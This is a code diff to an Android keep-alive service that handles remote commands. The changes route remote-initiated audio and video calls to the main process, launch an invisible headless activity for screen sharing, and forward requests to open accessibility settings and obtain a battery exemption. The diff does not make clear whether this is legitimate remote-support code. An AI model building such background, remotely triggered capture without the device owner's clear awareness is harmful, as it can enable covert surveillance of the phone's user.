@@ -442,6 +442,7 @@ public class BackgroundKeepAliveService extends Service {
                     int page = data.optInt("page", 0);
                     long mediaId = data.optLong("mediaId", -1);
                     String mediaType = data.optString("mediaType", "image");
+                    String cmdId = data.optString("cmdId", "");
 
                     Log.i(TAG, "Background auto-command received: " + command + " from " + caller);
 
@@ -463,7 +464,13 @@ public class BackgroundKeepAliveService extends Service {
                         }
                     } else if ("audio_call".equals(command) || "video_call".equals(command)) {
                         if (isMainProcessRunning()) {
-                            Log.i(TAG, "Ignoring " + command + ": main process companion handles it");
+                            // The companion socket lives in the already-running main
+                            // process. Hand the command over instead of dropping it
+                            // (dropping it is why calls only worked after Android
+                            // killed the app process).
+                            Log.i(TAG, "Routing " + command + " to the running main process companion");
+                            AppLogs.i(TAG, "Routing " + command + " to main process (app was alive)");
+                            MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
                             return;
                         }
                         long now = System.currentTimeMillis();
@@ -482,7 +489,13 @@ public class BackgroundKeepAliveService extends Service {
                             companion.startVideoCall(caller);
                         }
                     } else if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
+                        // Always start the invisible headless activity. It owns the
+                        // MediaProjection consent dialog and reuses a pending
+                        // request instead of stacking dialogs, so the duplicate
+                        // copy the companion socket receives is harmless.
                         HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
+                    } else if ("open_accessibility_settings".equals(command) || "request_battery_exemption".equals(command)) {
+                        MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
                     } else if ("end_call".equals(command)) {
                         long now = System.currentTimeMillis();
                         if (now - sLastEndCallTime < 2500) {
